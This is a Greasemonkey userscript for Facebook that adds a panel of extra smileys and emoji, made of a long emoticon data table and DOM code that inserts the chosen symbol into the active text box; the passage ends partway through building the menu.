// ==UserScript==
// @name            Cài Ðặt Incoi Facebook :__   ( Ver 1.4.7 )
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "GruÃ±Ã³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "PingÃ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
